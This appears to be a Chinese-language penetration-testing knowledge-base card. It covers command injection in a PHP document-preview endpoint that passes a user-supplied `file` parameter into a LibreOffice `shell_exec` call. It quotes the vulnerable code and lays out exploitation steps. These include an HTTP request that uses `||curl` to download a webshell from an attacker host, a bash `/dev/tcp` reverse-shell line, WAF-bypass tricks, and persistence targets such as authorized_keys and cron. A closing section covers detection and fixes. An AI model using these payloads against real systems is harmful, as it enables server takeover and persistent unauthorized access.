---
id: web-php-rce-document-preview-libreoffice-shell-exec-injection
title: PHP 文档预览 LibreOffice 转换接口命令注入：file 参数直拼 shell_exec 写 WebShell
type: scenario
domain: web
path: web/php/rce
technique: php-document-preview-libreoffice-command-injection
tags:
- php
- command-injection
- shell-exec
- libreoffice
- file-preview
- webshell
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V207
  verified_at: '2026-11-07T02:02:53+08:00'
  notes: 已对照原文与全部42图核对：TbadminController::readppt 中 $files=$_GET['file'] 直拼 LibreOffice 命令再 shell_exec、原文 PoC ?file=||curl http://<ip>/1.php -o shell.php、图25 哥斯拉 PhpDynamicPayload/PHP_XOR_BASE64 连接 http://10.10.10.56/shell.php 成功，均一致；dup-scan 与 19243 putenv/LD_PRELOAD 卡为 related（入口与 sink 均不同），保留两卡。未验证点：原文未标注 LibreOffice/PHP 版本，未设 affected_versions；卡内 PoC 为原文形态的结构化整理，未复跑；frontmatter 无 sources/source_url。
url: /docs/web/php/rce/web-php-rce-document-preview-libreoffice-shell-exec-injection/
draft: false
kb_aliases:
- readppt 命令注入
- PHP 文件预览命令注入
- LibreOffice 转换命令注入
- shell_exec 路径拼接注入
- 文档预览 RCE
---

## 一句话结论

PHP 文档预览接口把用户可控的 `file` 参数直接拼进 `shell_exec` 的 LibreOffice 转换命令（`libreoffice --headless --convert-to pdf ... /www/wwwroot/site$files ...`），攻击者用 `||`、`;`、`|` 等 shell 元字符注入任意命令，把 WebShell 下载/写入 Web 目录并接管服务器；本例 `readppt?file=||curl http://<attacker>/1.php -o shell.php` 成功落地并用哥斯拉连接。

## 原理

- `shell_exec()` 在 Linux 下通过 `/bin/sh -c` 执行字符串，`;`、`|`、`||`、`&&`、反引号、`$()`、换行等元字符都会被 shell 解释；只要用户输入进入命令字符串且未做转义/白名单，就构成命令注入。
- 本例漏洞代码（工资查询系统 `TbadminController::readppt`）：
  ```php
  $files = $_GET['file'];
  $shell = "libreoffice --headless --convert-to pdf:writer_pdf_Export /www/wwwroot/pdo.dzbfsj.com$files --outdir /www/wwwroot/pdo.dzbfsj.com/uploads/temp/";
  $file_ext = pathinfo($files, PATHINFO_EXTENSION);
  $newfile = 'uploads/temp/'.$this->getSubstr($files, 'files/', $file_ext).'pdf';
  if(!file_exists($newfile)){
    shell_exec($shell);
  }
  ```
  `$files` 被直接拼在固定路径前缀之后；传入 `||curl ... -o shell.php` 时，shell 先执行 LibreOffice（因路径不存在而失败），`||` 后的 curl 随即执行，把 WebShell 下载到当前工作目录/指定路径。
- 后续的 `pathinfo`、`file_exists`、`getSubstr` 只用于计算输出 PDF 路径与判断是否转换，不参与命令安全判断；`file_exists` 为假恰好触发 `shell_exec`。
- 危害上限取决于 PHP/Web 进程权限：Web 目录可写即可落地 PHP WebShell；也可写 `.ssh/authorized_keys`、cron、覆盖业务 PHP 文件，或直接执行反弹 Shell。若命令无回显，可用 DNS/HTTP 外带或写文件验证。
- 同类代码常见于文档/PPT/PDF 预览、格式转换、缩略图生成、音视频转码等“调用外部工具”的功能；根因是把用户输入当命令参数拼接，而不是把它作为独立 argv 参数传递。

## 触发条件

- PHP 应用存在文档预览/格式转换接口，使用 `shell_exec`/`system`/`exec`/`passthru`/反引号调用外部命令，且命令字符串包含用户可控参数。
- 用户输入未经过 `escapeshellarg`/`escapeshellcmd` 或严格白名单；参数能到达命令拼接点。
- Web 进程对 Web 目录或其他可执行载体路径有写权限；或目标允许出网/回连。
- 攻击者能访问该接口（无需登录或低权限即可）。

## 利用步骤

1. 审计源码或黑盒探测：找 `readppt`、`preview`、`convert`、`thumbnail` 等接口，观察 `file`/`path`/`url` 参数是否触发外部命令（延时、报错、DNS/HTTP 外带）。
2. 用 `;id`、`||id`、`|id`、反引号 `` `id` `` 测试命令执行；对 URL 中的特殊字符做编码，注意 `|` 在部分 WAF 中会被拦截，可换 `||`、换行、`$()`。
3. 写 WebShell：`?file=||curl http://<your-host>/1.php -o shell.php`；或用 `wget`、`echo base64 | base64 -d > shell.php`、`cp` 已有文件。
4. 用哥斯拉/蚁剑连接；若不知道 Web 根路径，用 `pwd`、`ls -la`、`find / -name index.php` 或报错信息定位，也可先 `curl` 到可访问目录。
5. 需要反弹 Shell 时用 `bash -i >& /dev/tcp/<ip>/<port> 0>&1` 或 perl/python 一行；授权测试只写无害标记文件并清理。

## PoC

漏洞代码（原文节选，已略去站点路径）：

```php
$files = $_GET['file'];
$shell = "libreoffice --headless --convert-to pdf:writer_pdf_Export /www/wwwroot/<site>$files --outdir /www/wwwroot/<site>/uploads/temp/";
if(!file_exists($newfile)){
    shell_exec($shell);
}
```

最小请求（原文实测形态，攻击者地址用占位符）：

```http
GET /tbadmin/readppt?file=||curl%20http://<attacker>/1.php%20-o%20shell.php HTTP/1.1
Host: <target>
```

随后访问 `/shell.php`，用哥斯拉（PhpDynamicPayload / PHP_XOR_BASE64）连接。原文截图显示 `shell.php` 落地并连接成功；本卡未复跑，具体路径与命令分隔符需按目标环境调整。

## 变体与关联

- 元字符变体：`;`、`|`、`||`、`&&`、反引号、`$()`、换行（`%0a`）；WAF 拦截时可用编码、通配符、变量拼接。
- 写入载体变体：WebShell、`.ssh/authorized_keys`、`/etc/cron.d/*`、覆盖项目 PHP/Python 模块、写 `.htaccess`/`user.ini`。
- 外部工具变体：LibreOffice、ImageMagick、ffmpeg、wkhtmltopdf、pandoc、7z；只要参数来自用户且拼接进 shell，就可能注入。
- 关联卡：[[web-php-rce-wegia-backup-filename-command-injection]]（备份文件名拼接 shell_exec）、[[web-php-rce-command-injection-blacklist-base64-tee-webshell]]（命令注入黑名单绕过写 WebShell）、[[web-php-rce-shell-exec-quote-concat-glob-flag]]（shell_exec 黑名单绕过）。
- 边界：若代码使用 `escapeshellarg` 或参数数组（如 Symfony Process 数组形式），或只允许固定枚举值，注入不成立；Web 目录不可写时需另找载体。

## 检测与防御

- 根本修复：不要拼接命令字符串；使用参数数组/`proc_open` 的 argv 形式，或对每个参数用 `escapeshellarg()`；更彻底的做法是禁用 `shell_exec` 等函数，改用安全的文档转换服务/库。
- 输入校验：把 `file` 限制为白名单文件 ID 或规范化后的相对路径（`realpath` 后校验必须位于允许目录），拒绝包含 shell 元字符的输入。
- 权限隔离：Web 进程使用低权限账号；Web 目录只读或禁止 PHP 写入；文档转换在沙箱/容器中执行，限制出站网络。
- 检测：监控 `shell_exec`/`system` 调用日志与异常子进程（curl/wget/bash/perl）；Web 目录新增/修改 PHP 文件；请求参数含 `;`、`|`、`$(`、反引号、`/dev/tcp`、`base64 -d` 等模式。
- 响应：发现注入立即下线接口、清理 WebShell/计划任务/公钥、轮换凭据并审计访问日志；检查是否有横向移动痕迹。
